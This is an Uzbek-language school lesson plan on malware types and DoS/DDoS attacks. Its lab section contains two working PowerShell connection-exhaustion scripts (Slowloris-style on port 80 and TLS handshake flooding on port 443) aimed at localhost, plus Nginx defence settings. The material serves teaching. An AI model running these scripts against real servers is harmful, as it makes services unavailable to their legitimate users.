---
title: "Kibertahdidlarning turlari (1-qism): zararli dasturlar va DoS/DDoS hujumlari"
description: "Zararli dasturlar tasnifi (virus, troyan, qurt, rootkit, ransomware) hamda DoS va Slowloris hujumlarining ishlash mexanizmi"
dars: 2
hafta: 1
sinf: 10-sinf-cyber
---

# 2-dars. Kibertahdidlarning turlari (1-qism): zararli dasturlar va DoS/DDoS hujumlari

## Dars rejasi (80 daqiqa)

1. **O'tgan mavzuni takrorlash va kirish (10 daqiqa):** Aktivlar, zaifliklar va tahdidlar tushunchalarini eslash, yangi mavzu maqsadlari.
2. **Nazariy qism (25 daqiqa):**
   - Zararli dasturiy ta'minot (Malware) tushunchasi va maqsadlari.
   - Zararli dasturlarning 9 ta asosiy turi:
     1. Viruslar (Viruses);
     2. Qurtlar (Worms);
     3. Troyan otlari (Trojan horses);
     4. Adware (Reklama dasturlari);
     5. Spyware (Josus dasturlar);
     6. Rootkitlar (Yashirin boshqaruv vositalari);
     7. Backdoor (Orqa eshiklar);
     8. Mantiqiy bombalar (Logic bombs);
     9. Botnetlar va Ransomware (Tovlamachi dasturlar).
   - Xizmat ko'rsatishni rad etish (DoS va DDoS) hujumlari mohiyati.
   - Slowloris hujumi va TLS handshake to'yinganligi arxitekturasi.
3. **Amaliy laboratoriya mashg'uloti (30 daqiqa):**
   - Izolyatsiya qilingan laboratoriya muhitida DoS hujumini simulyatsiya qilish (Windows PowerShell Slowloris skripti).
   - Server resurslarini (CPU, RAM, tarmoq ulanishlari soni) monitoring qilish.
   - Wireshark yordamida DoS paketlarini kuzatish.
4. **Mustaqil topshiriqlar va muhokama (10 daqiqa):** 10 ta amaliy vazifani tahlil qilish.
5. **Xulosa va baholash (5 daqiqa):** Tezkor test, dars xulosasi va uyga vazifa.

---

## Asosiy tushunchalar

- **Zararli dastur (Malware):** Foydalanuvchining ruxsatisiz va xabarisiz tizimga suqilib kiruvchi, buzuvchi, o'g'irlovchi yoki kompyuter faoliyatini boshqaruvchi dasturiy vosita.
- **Virus (Virus):** O'zini o'zi ko'paytiruvchi va boshqa qonuniy fayllar (masalan, .exe, .docx) yoki yuklanuvchi sektor (boot sector) ichiga birikuvchi zararli dastur.
- **Qurt (Worm):** Foydalanuvchi aralashuvisiz, kompyuter tarmoqlari orqali avtomatik tarzda o'z nusxalarini tarqatuvchi mustaqil dastur.
- **Troyan oti (Trojan Horse):** O'zini foydali yoki xavfsiz dastur (o'yin, kalkulyator, krek) sifatida ko'rsatuvchi, ammo ichida yashirin zararli funksiyani bajaruvchi dastur.
- **Ransomware:** Qurbon kompyuteridagi muhim fayllarni (hujjatlar, fotosuratlar, ma'lumotlar bazalarini) kuchli shifrlovchi va kalitni berish uchun to'lov (odatda kriptovalyutada) talab qiluvchi dastur.
- **Rootkit:** Operatsion tizimning chuqur yadrosiga (kernel) joylashib, o'zining va boshqa zararli dasturlarning izlarini tizim dispetcheri va antiviruslardan yashiruvchi vosita.
- **Backdoor:** Tizimga odatiy autentifikatsiya (login-parol)siz, yashirincha kirish imkonini beruvchi tuynuk yoki dasturiy modul.
- **Botnet:** Kiberjinoyatchi (Botmaster) tomonidan markaziy boshqaruv serveri (C2) orqali masofadan boshqariladigan infektsiyalangan «zombi» kompyuterlar tarmog'i.
- **DoS (Denial of Service):** Tizim resurslarini (xotira, protsessor, tarmoq o'tkazuvchanligi) sun'iy so'rovlar bilan to'ldirib, qonuniy foydalanuvchilarga xizmat ko'rsatishni to'xtatuvchi hujum.
- **DDoS (Distributed Denial of Service):** DoS hujumining bir vaqtning o'zida yuzlab yoki minglab turli manbalardan (botnet orqali) amalga oshiriladigan taqsimlangan ko'rinishi.
- **Slowloris:** Kam tarmoq o'tkazuvchanligi sarflab, veb-serverga sekin va tugallanmagan HTTP so'rovlar yuborish orqali barcha mavjud ulanish o'rinlarini (connection slots) band qilib qo'yuvchi past tezlikli DoS usuli.

---

## Dars mazmuni

### 1. Zararli dasturlarning tasnifi

Zararli dasturlar (Malware — Malicious Software) kompyuter tizimlarining xavfsizligini obro'sizlantirish, maxfiy ma'lumotlarni o'g'irlash yoki resurslarni ekspluatatsiya qilish uchun yaratiladi.

```
+-------------------------------------------------------------------------+
|                    ZARARLI DASTURLAR TASNIFI (MALWARE)                  |
+-------------------------------------------------------------------------+
| Ko'payish usuli bo'yicha:       | Funksional maqsadi bo'yicha:          |
| - Virus (fayllarga birikadi)    | - Spyware (ma'lumotlarni josuslash)   |
| - Qurt / Worm (tarmoqda tarqaladi)| - Ransomware (fayllarni shifrlash)    |
| - Troyan (niqoblanadi)          | - Adware (reklama ko'rsatish)         |
|                                 | - Rootkit (tizimda yashirinish)       |
|                                 | - Botnet (hujumlarda foydalanish)     |
+-------------------------------------------------------------------------+
```

1. **Virus:** Boshqa faylga mezbon sifatida muhtoj. Foydalanuvchi zararlangan `.exe` faylini ishga tushirmaguncha u faollashmaydi.
2. **Qurt (Worm):** Mezbon faylga muhtoj emas. Tarmoqdagi zaifliklar (masalan, SMB protokoli zaifligi — EternalBlue) orqali bitta kompyuterdan butun tarmoqqa soniyalar ichida tarqaladi.
3. **Troyan oti (Trojan):** O'zini qonuniy va xavfsiz dastur (masalan, kompyuterni tozalovchi dastur yoki o'yin modifikatsiyasi) qilib ko'rsatadi. Foydalanuvchi o'z qo'li bilan o'rnatadi.
4. **Spyware (Josus dastur):** Foydalanuvchining klaviaturada nima terayotganini (Keylogger), brauzer tarixini, ochilgan veb-kameralarni kuzatib, ma'lumotlarni hujumchiga jo'natadi.
5. **Ransomware (Tovlamachi dastur):** Bugungi kundagi eng xavfli kibertahdid. Qurbon fayllarini asimmetrik shifrlab (AES + RSA), ekranga «Barcha fayllaringiz shifrlandi, 0.5 Bitcoin to'lang» degan xabar chiqaradi.
6. **Rootkit va Backdoor:** Operatsion tizimning eng chuqur sathida ishlaydi, antiviruslar ko'ra olmaydi va doimiy boshqaruv kanali ochib beradi.
7. **Botnet:** Minglab zararlangan kompyuterlar yagona tarmoqqa birlashadi va buyruq kelishi bilan bir vaqtning o'zida yirik saytlarga DDoS hujum uyushtiradi.

---

### 2. DoS va DDoS hujumlari arxitekturasi

DoS hujumining maqsadi — ma'lumotni o'g'irlash emas, balki tizimning **foydalanuvchanligini (Availability)** yo'q qilishdir.
- **Volumetric Attack (Katta hajmli hujum):** Serverning internet kanalini keraksiz axlat paketlar (UDP flood, ICMP flood) bilan to'ldirish.
- **Resource Exhaustion (Resurslarni tugatish):** Serverning protsessori (CPU) yoki operativ xotirasini (RAM) 100% band qilib, qotirib qo'yish.
- **Application Layer Attack (Ilova darajasidagi hujum):** Veb-serverning HTTP ulanish chegarasini band qilish (Slowloris).

#### Slowloris qanday ishlaydi?
Klassik veb-server (masalan, Apache 2.2) bir vaqtning o'zida ma'lum miqdordagi ulanishlarni (masalan, 200-400 ta oqim) qabul qila oladi. Slowloris:
1. Server bilan to'liq HTTP so'rovni tugatmasdan, har bir necha soniyada bittadan soxta sarlavha (header) jo'natadi (`X-a: b\r\n`).
2. Server ulanish tugashini kutib, oqimni (socket) ochiq ushlab turadi.
3. Hujumchi 300-500 ta mana shunday sekin ulanish ochishi bilan yangi qonuniy foydalanuvchilar saytga kira olmay qoladi («Server connection timed out»).

---

## Amaliy laboratoriya mashg'uloti

> [!CAUTION]
> Ushbu amaliy mashg'ulot faqat laboratoriya muhitidagi sinov serverlarida yoki mahalliy (localhost / 127.0.0.1) tizimda o'rganish maqsadida bajariladi. Ruxsat berilmagan tashqi tarmoqlarga hujum qilish qonunan taqiqlanadi!

### 1-qadam: Slowloris DoS simulyatsiyasi (PowerShell)

Windows tizimida 80-portda ishlovchi sinov serveriga (masalan, XAMPP / IIS / Python HTTP server) sekin ulanishlar yuborish:

```powershell
# 500 ta sekin TCP ulanish ochish orqali 80-portni band qilish
1..500 | ForEach-Object {
    Start-Job -ScriptBlock {
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $tcp.Connect("127.0.0.1", 80)
            $stream = $tcp.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            # Tugallanmagan so'rov yuborish
            $writer.WriteLine("GET / HTTP/1.1`r`nHost: localhost`r`n")
            $writer.Flush()
            Start-Sleep -Seconds 300   # 5 daqiqa davomida soketni ochiq ushlaydi
        } catch {
            # Xatolik yuz bersa o'tish
        }
    }
}
Write-Host "500 ta sekin ulanish ochildi – server soketlari to'ldi!"
```

### 2-qadam: HTTPS 443-portga DoS hujumi simulyatsiyasi (TLS Handshake to'yinganligi)

TLS shifrlash server CPU siga katta yuklama beradi. Minglab shifrlash qo'l berishishlari (handshake) ochilganda protsessor bandligi 100% ga yetadi:

```powershell
1..1000 | ForEach-Object {
    Start-Job -ScriptBlock {
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $tcp.Connect("127.0.0.1", 443)
            $ssl = New-Object System.Net.Security.SslStream($tcp.GetStream(), $false, ({$true}))
            $ssl.AuthenticateAsClient("localhost")
            Start-Sleep -Seconds 60
        } catch {}
    }
}
Write-Host "1000 ta TLS handshake ochildi – CPU monitoring qilinmoqda!"
```

### 3-qadam: Resurslar va ulanishlar monitoringi
PowerShell yoki buyruqlar satrida faol ulanishlarni tekshirish:
```powershell
Get-NetTCPConnection -LocalPort 80 | Group-Object State
```

---

## Mustaqil topshiriqlar

### 1. Virus va Qurt o'rtasidagi asosiy farq · oson
Nima sababdan qurtlar (worms) tarmoqda viruslarga qaraganda ancha tez va keng miqyosda tarqaladi?
**Yechim:** Virus o'zini tarqatishi uchun insonning harakati talab etiladi (zararlangan faylni yuklab olish, uni ochish, fleshkaga ko'chirish). Qurt esa tarmoqdagi xatoliklar va ochiq zaif portlar orqali odam aralashuvisiz, o'zi mustaqil tarzda tarmoq bo'ylab nusxa ko'chirib tarqaladi.

### 2. Slowloris hujumi xususiyati · oson
Nima sababdan Slowloris hujumini amalga oshirish uchun yuqori tezlikdagi internet kanali (gigabitli aloqa) talab qilinmaydi?
**Yechim:** Slowloris kanaldagi trafik hajmini to'ldirishga emas, balki veb-serverdagi ulanish o'rinlari (connection pool / thread pool) sonini band qilishga qaratilgan. Har bir ulanishda bor-yo'g'i bir necha bayt ma'lumot sekin uzatiladi, shuning uchun hatto mobil internet orqali ham serverni band qilib qo'yish mumkin.

### 3. Ransomware shifrlash mexanizmi tahlili · o'rta
Zamonaviy tovlamachi viruslar nega simmetrik (AES) va asimmetrik (RSA) shifrlashni birgalikda (gibrid) qo'llaydi?
**Yechim:** AES juda tez ishlaydi va foydalanuvchining gigabaytlab fayllarini soniyalar ichida shifrlaydi. Keyin virus yaratuvchisi ushbu AES kalitining o'zini o'ziga tegishli ochiq RSA kaliti bilan shifrlab qo'yadi. Natijada shaxsiy RSA kalitisiz hech kim AES kalitni, demakki fayllarni o'qiy olmaydi.

### 4. DoS va DDoS farqi · o'rta
Bitta kompyuterdan qilingan DoS hujumini server administratori qanday qilib oson to'xtata oladi? Nima uchun xuddi shu usul DDoS hujumida ish bermaydi?
**Yechim:** Bitta kompyuterdan bo'lgan DoS hujumida hujumchining IP manzili darhol aniqlanadi va tarmoqlararo ekranda (Firewall) bitta qoida bilan (`iptables -A INPUT -s <IP> -j DROP`) bloklab qo'yiladi. DDoS hujumida esa so'rovlar dunyo bo'ylab millionlab turli IP lardagi botnetlardan kelgani sababli, ularning barchasini bitta qoida bilan yopib bo'lmaydi va oddiy bloklash foydalanuvchilarga ham xizmatni to'xtatadi.

### 5. Slowloris hujumiga qarshi himoya choralari · o'rta
Veb-serverni (Nginx yoki Apache) Slowloris hujumidan himoya qilish uchun qanday 3 ta konfiguratsion chora ko'rish kerak?
**Yechim:**
1. `client_header_timeout` va `client_body_timeout` parametrlarini minimal vaqtga (masalan, 5-10 soniya) tushirish;
2. Bitta IP manzildan ochiladigan ulanishlar soniga cheklov qo'yish (`limit_conn_zone`);
3. Nginx ni reverse-proxy qilib Apache oldiga qo'yish (chunki Nginx asinxron arxitekturaga ega bo'lib, bo'sh ulanishlarni resurs sarflamasdan boshqaradi).

### 6. Trojan otini aniqlash belgilari · oson
Foydalanuvchi internetdan «Office 2024 aktivator» dasturini yuklab oldi va ishga tushirdi. Dastur ishlagandek bo'ldi, ammo orqa fonda kompyuter sekinlashdi va internet trafigi oshdi. Bu yerda troyan qanday vazifani bajargan bo'lishi mumkin?
**Yechim:** Foydalanuvchi foydali deb o'ylagan aktivator ichida yashiringan kriptovalyuta mayneri (Cryptominer) yoki teskari ulanish beruvchi troyan (RAT — Remote Access Trojan) bo'lgan. U kompyuterni buzg'unchi botnetiga ulab bergan.

### 7. Rootkit xavfi tahlili · qiyin
Nima uchun operatsion tizim ichida ishlayotgan oddiy antivirus ko'pincha Rootkit dasturlarini topa olmaydi?
**Yechim:** Rootkit operatsion tizim yadrosi (Kernel) sathida ishlaydi va OT ning tizimli chaqiriqlarini (API hooking) o'zgartiradi. Masalan, antivirus fayllar ro'yxatini yoki jarayonlarni so'raganda, Rootkit o'zining fayllari va jarayonlarini natijadan o'chirib, antivirusga «hammasi joyida» degan yolg'on ma'lumot beradi. Uni aniqlash uchun kompyuterni xavfsiz rejimda yoki boshqa yuklanuvchi USB tizimdan tekshirish kerak.

### 8. Mantiqiy bomba (Logic Bomb) ssenariysi · o'rta
Kompaniyadan haydalgan dasturchi ma'lumotlar bazasi kodiga: «Agar 2026-yil 31-dekabrgacha mening xodimlar bazasida statusim "Ishlaydi" bo'lmasa, barcha mijozlar bazasini o'chir» degan kod kiritgan. Bu qanday zararli dastur turiga kiradi va uning xavfi nimada?
**Yechim:** Bu mantiqiy bomba (Logic Bomb). Uning xavfi shundaki, u ma'lum bir vaqt yoki voqea sodir bo'lmaguncha hech qanday shubhali harakat qilmaydi va tinch yotadi. Uni oldini olish uchun kodlarni boshqa dasturchilar tomonidan muntazam tekshiruvdan o'tkazish (Code Review) zarur.

### 9. PowerShell DoS skripti tahlili · qiyin
Darsdagi Slowloris PowerShell skriptida nima sababdan `Start-Sleep -Seconds 300` buyrug'i ishlatilgan?
**Yechim:** Ushbu buyruq ochilgan TCP soketini yopmasdan, 300 soniya (5 daqiqa) davomida kutish rejimida ushlab turadi. Maqsad — server tomonidagi resurs va oqimni (thread) imkon qadar uzoq vaqt band qilib turishdir.

### 10. Botnet arxitekturasi va C2 serveri · bonus
Hujumchi 10 000 ta kompyuterni o'ziga bo'ysundirgan. U ushbu kompyuterlarga qanday qilib bir vaqtda buyruq beradi va agar C2 (Command and Control) serveri huquq-tartibot organlari tomonidan o'chirilsa, botnet qanday taqdirga uchraydi?
**Yechim:** Botlar C2 serveriga muntazam ravishda («beaconing») so'rov yuborib yangi buyruqlarni tekshirib turadi. Agar markaziy C2 serveri bloklansa, an'anaviy markazlashgan botnet boshqaruvi yo'qoladi va botlar yetim (orphaned) bo'lib qoladi. Shu sababli zamonaviy botnetlar bloklanishga chidamli Peer-to-Peer (P2P) yoki DGA (Domain Generation Algorithm) texnologiyalaridan foydalanadi.

---

## Tezkor savol-javob

1. **Savol:** DoS hujumining asosiy maqsadi nima?
   **Javob:** Tizimning foydalanuvchanligini (Availability) yo'qotish va qonuniy mijozlarga xizmat ko'rsatishni to'xtatish.
2. **Savol:** Worm va Virusning eng katta farqi nimada?
   **Javob:** Worm tarmoq orqali odam ishtirokisiz mustaqil tarqaladi, virus esa boshqa faylga birikib, inson tomonidan ishga tushirilishiga muhtoj.
3. **Savol:** Nega Slowloris past tezlikli DoS deb ataladi?
   **Javob:** U tarmoq kanalini axlat trafik bilan to'ldirmaydi, balki juda kam baytlar uzatib, server soketlarini band qilib qo'yadi.
4. **Savol:** Ransomware qanday zarar yetkazadi?
   **Javob:** Foydalanuvchining shaxsiy fayllarini shifrlab, ularni ochish uchun tovon puli talab qiladi.

---

## Mentor uchun eslatma

- PowerShell skriptlarini faqat o'quv laboratoriyasi muhitida (localhost) ko'rsating.
- Slowloris hujumi vaqtida Task Manager (Vazifalar dispetcheri) yoki resurslar monitorini ochib, ulanishlar soni va protsessor bandligini ekranda jonli namoyish eting.
- O'quvchilarga ushbu bilimlardan faqat himoya mexanizmlarini to'g'ri sozlashda foydalanish zarurligini uqtiring.
